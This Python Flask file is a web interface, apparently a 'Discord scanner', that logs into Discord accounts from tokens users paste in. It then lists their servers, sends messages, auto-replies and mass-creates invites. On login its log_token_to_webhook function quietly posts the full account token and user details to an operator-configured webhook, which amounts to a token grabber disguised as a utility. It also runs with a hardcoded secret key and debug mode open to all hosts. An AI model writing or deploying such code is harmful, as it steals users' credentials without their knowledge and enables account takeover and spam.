#!/usr/bin/env python3
"""
Discord Scanner Web Interface
"""

from flask import Flask, render_template, request, jsonify, session
import asyncio
import threading
import json
import os
from datetime import datetime
import discord
import aiohttp

app = Flask(__name__)
app.secret_key = 'discord_scanner_web_key_2025'

# Global variables to store scanner state
scanner_instances = {}
active_connections = {}

class WebDiscordScanner:
    def __init__(self, session_id):
        self.session_id = session_id
        self.client = None
        self.servers_cache = {}
        self.selected_server = None
        self.selected_channel = None
        self.webhook_url = None
        self.connected = False
        self.user_info = None
        self.auto_reply_enabled = False
        self.auto_reply_responses = []
        
    async def connect_discord(self, token):
        """Connect to Discord"""
        try:
            print(f"Creating Discord client for session {self.session_id}")
            self.client = discord.Client()
            
            @self.client.event
            async def on_ready():
                print(f"Discord client ready for session {self.session_id}")
                self.connected = True
                self.user_info = {
                    'username': str(self.client.user),
                    'id': self.client.user.id
                }
                
                # Log to webhook if configured
                if self.webhook_url:
                    print(f"Logging to webhook for session {self.session_id}")
                    await self.log_token_to_webhook(token)
                
                # Cache servers
                print(f"Scanning servers for session {self.session_id}")
                await self.scan_servers()
                print(f"Scan complete, found {len(self.servers_cache)} servers")
            
            @self.client.event
            async def on_message(message):
                # Auto-reply functionality
                if self.auto_reply_enabled and message.author != self.client.user and not message.author.bot:
                    is_mentioned = message.mentions and self.client.user in message.mentions
                    is_dm = isinstance(message.channel, discord.DMChannel)
                    is_group_dm = isinstance(message.channel, discord.GroupChannel)
                    
                    if is_dm or is_group_dm or is_mentioned:
                        if self.auto_reply_responses:
                            try:
                                import random
                                response = random.choice(self.auto_reply_responses)
                                await message.reply(response)
                                print(f"Auto-replied to {message.author.name}: {response}")
                                await asyncio.sleep(random.uniform(1, 3))
                            except Exception as e:
                                print(f"Auto-reply error: {e}")
            
            print(f"Starting Discord client for session {self.session_id}")
            await self.client.start(token)
            
        except discord.LoginFailure as e:
            print(f"Login failed for session {self.session_id}: {e}")
            self.connected = False
            self.error = f"Login failed: {str(e)}"
            raise e
        except Exception as e:
            print(f"Connection error for session {self.session_id}: {e}")
            self.connected = False
            self.error = str(e)
            raise e
    
    async def log_token_to_webhook(self, token):
        """Log access token to webhook"""
        if not self.webhook_url:
            return False
        
        try:
            user_info = f"{self.client.user.name}#{self.client.user.discriminator} ({self.client.user.id})"
            
            embed = {
                "title": "🔑 Discord Token Access Log",
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "Full Access Token",
                        "value": f"`{token}`",
                        "inline": False
                    },
                    {
                        "name": "User Info",
                        "value": user_info,
                        "inline": True
                    },
                    {
                        "name": "Timestamp",
                        "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
                        "inline": True
                    },
                    {
                        "name": "Access Method",
                        "value": "Web Interface",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "Token Access Monitor - Web"
                }
            }
            
            payload = {
                "embeds": [embed],
                "username": "Token Access Logger"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(self.webhook_url, json=payload) as response:
                    return response.status == 204
                    
        except Exception as e:
            print(f"Webhook error: {e}")
            return False
    
    async def scan_servers(self):
        """Scan all servers for information"""
        self.servers_cache = {}
        
        for guild in self.client.guilds:
            try:
                server_info = {
                    'id': str(guild.id),
                    'name': guild.name,
                    'member_count': guild.member_count,
                    'text_channels': []
                }
                
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).send_messages:
                        server_info['text_channels'].append({
                            'id': str(channel.id),
                            'name': channel.name,
                            'category': channel.category.name if channel.category else 'No Category'
                        })
                
                self.servers_cache[guild.name] = server_info
                
            except Exception as e:
                print(f"Error scanning {guild.name}: {e}")
    
    async def send_message(self, channel_id, message):
        """Send message to a channel"""
        try:
            if not self.client or not self.connected:
                return False
                
            channel = self.client.get_channel(int(channel_id))
            if channel:
                # Use the client's loop to send the message
                if hasattr(self.client, 'loop') and self.client.loop:
                    if self.client.loop.is_running():
                        # Create a future and schedule it on the client's loop
                        future = asyncio.run_coroutine_threadsafe(
                            channel.send(message), self.client.loop
                        )
                        future.result(timeout=10)  # Wait up to 10 seconds
                        return True
                    else:
                        # Fallback to direct await
                        await channel.send(message)
                        return True
                else:
                    await channel.send(message)
                    return True
            return False
        except Exception as e:
            print(f"Error sending message: {e}")
            return False

def load_config():
    """Load webhook URL from config"""
    try:
        if os.path.exists('config.json'):
            with open('config.json', 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/connect', methods=['POST'])
def connect():
    data = request.json
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'success': False, 'error': 'No token provided'})
    
    session_id = session.get('session_id', os.urandom(16).hex())
    session['session_id'] = session_id
    
    # Load webhook URL from config
    config = load_config()
    webhook_url = config.get('webhook_url')
    
    # Create scanner instance
    scanner = WebDiscordScanner(session_id)
    scanner.webhook_url = webhook_url
    scanner_instances[session_id] = scanner
    
    # Connect in background thread
    def connect_async():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(scanner.connect_discord(token))
        except Exception as e:
            scanner.connected = False
            scanner.error = str(e)
            print(f"Connection error: {e}")
        finally:
            loop.close()
    
    thread = threading.Thread(target=connect_async)
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'session_id': session_id})

@app.route('/status')
def status():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'connected': False})
    
    scanner = scanner_instances[session_id]
    
    if scanner.connected:
        return jsonify({
            'connected': True,
            'user_info': scanner.user_info,
            'servers': list(scanner.servers_cache.keys()),
            'webhook_configured': bool(scanner.webhook_url)
        })
    elif hasattr(scanner, 'error'):
        return jsonify({'connected': False, 'error': scanner.error})
    else:
        return jsonify({'connected': False, 'status': 'connecting'})

@app.route('/servers')
def get_servers():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'error': 'Not connected'})
    
    scanner = scanner_instances[session_id]
    return jsonify({'servers': scanner.servers_cache})

@app.route('/send_message', methods=['POST'])
def send_message():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'success': False, 'error': 'Not connected'})
    
    scanner = scanner_instances[session_id]
    data = request.json
    
    channel_id = data.get('channel_id')
    message = data.get('message')
    
    if not channel_id or not message:
        return jsonify({'success': False, 'error': 'Missing channel_id or message'})
    
    # Send message using the Discord client's event loop
    try:
        if not scanner.client or not scanner.connected:
            return jsonify({'success': False, 'error': 'Discord client not connected'})
        
        # Get the channel first to validate
        channel = scanner.client.get_channel(int(channel_id))
        if not channel:
            return jsonify({'success': False, 'error': 'Channel not found or no access'})
        
        # Send message using the client's event loop
        if hasattr(scanner.client, 'loop') and scanner.client.loop and scanner.client.loop.is_running():
            future = asyncio.run_coroutine_threadsafe(
                channel.send(message), scanner.client.loop
            )
            future.result(timeout=10)  # Wait up to 10 seconds
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Discord client event loop not available'})
            
    except asyncio.TimeoutError:
        return jsonify({'success': False, 'error': 'Message send timeout'})
    except Exception as e:
        print(f"Send message error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/rescan_servers', methods=['POST'])
def rescan_servers():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'success': False, 'error': 'Not connected'})
    
    scanner = scanner_instances[session_id]
    
    def rescan_async():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(scanner.scan_servers())
            return True
        except Exception as e:
            print(f"Rescan error: {e}")
            return False
        finally:
            loop.close()
    
    try:
        result = rescan_async()
        return jsonify({'success': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/export_data')
def export_data():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'error': 'Not connected'})
    
    scanner = scanner_instances[session_id]
    
    from flask import make_response
    import json
    
    response = make_response(json.dumps(scanner.servers_cache, indent=2))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = 'attachment; filename=server_data.json'
    
    return response

@app.route('/extract_invites', methods=['POST'])
def extract_invites():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'success': False, 'error': 'Not connected'})
    
    scanner = scanner_instances[session_id]
    
    async def extract_invites_async():
        invites = []
        try:
            for guild in scanner.client.guilds:
                try:
                    # Try to get existing invites
                    existing_invites = await guild.invites()
                    if existing_invites:
                        for invite in existing_invites:
                            invites.append({
                                'server': guild.name,
                                'url': str(invite),
                                'channel': invite.channel.name if invite.channel else 'Unknown'
                            })
                    else:
                        # Try to create a new invite
                        text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).create_instant_invite]
                        if text_channels:
                            channel = text_channels[0]
                            invite = await channel.create_invite(max_age=0, max_uses=0)
                            invites.append({
                                'server': guild.name,
                                'url': str(invite),
                                'channel': channel.name
                            })
                except Exception as e:
                    print(f"Error extracting invites from {guild.name}: {e}")
                    
        except Exception as e:
            print(f"General invite extraction error: {e}")
            
        return invites
    
    def extract_sync():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(extract_invites_async())
        finally:
            loop.close()
    
    try:
        invites = extract_sync()
        return jsonify({'success': True, 'invites': invites})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/update_settings', methods=['POST'])
def update_settings():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'success': False, 'error': 'Not connected'})
    
    data = request.json
    return jsonify({'success': True})

@app.route('/update_auto_reply', methods=['POST'])
def update_auto_reply():
    session_id = session.get('session_id')
    if not session_id or session_id not in scanner_instances:
        return jsonify({'success': False, 'error': 'Not connected'})
    
    data = request.json
    scanner = scanner_instances[session_id]
    
    scanner.auto_reply_enabled = data.get('enabled', False)
    scanner.auto_reply_responses = data.get('messages', [])
    
    return jsonify({'success': True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)